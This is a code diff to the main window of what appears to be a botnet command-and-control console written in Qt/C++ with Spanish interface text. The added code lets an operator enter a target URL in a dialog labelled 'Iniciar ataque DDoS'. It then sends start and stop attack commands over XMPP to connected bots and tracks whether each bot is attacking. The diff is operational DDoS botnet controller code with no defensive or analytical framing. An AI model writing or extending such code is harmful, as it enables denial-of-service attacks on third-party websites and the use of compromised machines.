@@ -5,8 +5,13 @@
 #include "xmppclient.h"
 #include "getstatuscommand.h"
 #include "getbotstatecommand.h"
+#include "startattackcommand.h"
+#include "stopattackcommand.h"
 #include "botstateresponse.h"
+#include "attackstartedresponse.h"
+#include "attackstoppedresponse.h"
 #include "bot.h"
+#include "attack.h"
 #include <QAction>
 #include <QMenu>
 #include <QMenuBar>
@@ -15,6 +20,7 @@
 #include <QLabel>
 #include <QCloseEvent>
 #include <QMessageBox>
+#include <QInputDialog>
 #include <QDebug>
 
 MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent)
@@ -27,6 +33,7 @@ MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent)
     setWindowTitle(APPLICATION_NAME);
     setWindowIcon(QIcon(":images/sauron.png"));
     setConnected(false);
+    setAttackInProgress(false);
 }
 
 void MainWindow::closeEvent(QCloseEvent *event)
@@ -59,12 +66,28 @@ void MainWindow::disconnectFromCC()
 
 void MainWindow::startAttack()
 {
+    bool ok;
+    QString target = QInputDialog::getText(this, tr("Iniciar ataque DDoS"), tr("URL Objetivo:"), QLineEdit::Normal, "", &ok);
 
+    if(ok && !target.isEmpty()) {
+        setAttackInProgress(true, target);
+
+        _xmppClient -> sendCommand(StartAttackCommand(_attack.target(), _attack.id()));
+    }
 }
 
 void MainWindow::stopAttack()
 {
+    bool stop = QMessageBox::question(this, tr("Confirmar parada"),
+                                            tr("¿Esta seguro de querer parar el ataque?"),
+                                            QMessageBox::Yes | QMessageBox::Default |
+                                            QMessageBox::No) == QMessageBox::Yes;
 
+    if(stop) {
+        _xmppClient -> sendCommand(StopAttackCommand(_attack.id()));
+
+        setAttackInProgress(false);
+    }
 }
 
 void MainWindow::about()
@@ -88,6 +111,7 @@ void MainWindow::readyOnXmppClient()
     qDebug() << "Command && Control ready";
 
     setConnected(true);
+    setAttackInProgress(false);
 }
 
 void MainWindow::disconnectedOnXmppClient()
@@ -95,6 +119,7 @@ void MainWindow::disconnectedOnXmppClient()
     qDebug() << "Disconnected from server";
 
     setConnected(false);
+    setAttackInProgress(false);
 }
 
 void MainWindow::responseReceivedOnXmppClient(Message *response)
@@ -102,7 +127,16 @@ void MainWindow::responseReceivedOnXmppClient(Message *response)
     qDebug() << "Response received from" << response -> from();
 
     if(BotStateResponse *botStateResponse = dynamic_cast<BotStateResponse *>(response))
-        _centralWidget -> addBot(botStateResponse -> from(), new Bot(*botStateResponse -> bot()));
+        _centralWidget -> insertBot(botStateResponse -> from(), new Bot(*botStateResponse -> bot()));
+    else if(dynamic_cast<AttackStartedResponse *>(response)) {
+        Bot *bot = _centralWidget -> bot(response -> from());
+        bot -> setState(AttackInProgress);
+        _centralWidget -> modifyBot(response -> from());
+    } else if(dynamic_cast<AttackStoppedResponse *>(response)) {
+        Bot *bot = _centralWidget -> bot(response -> from());
+        bot -> setState(WaitingForCommand);
+        _centralWidget -> modifyBot(response -> from());
+    }
 
     delete response;
 }
@@ -239,6 +273,17 @@ void MainWindow::setConnected(bool connected)
     _connectToCCAction -> setEnabled(!_connected);
     _disconnectFromCCAction -> setEnabled(_connected);
     _ccLabel -> setText(_connected ? tr("Conectado como %1").arg(_xmppClient -> configuration().jid()) : tr("Desconectado"));
+}
+
+void MainWindow::setAttackInProgress(bool inProgress, const QString& target)
+{
+    if(inProgress)
+        _attack.start(target);
+    else
+        _attack.stop();
+
+    _startAttackAction -> setEnabled(_connected && !_attack.inProgress());
+    _stopAttackAction -> setEnabled(_connected && _attack.inProgress());
 }
 
 bool MainWindow::verifyExit()
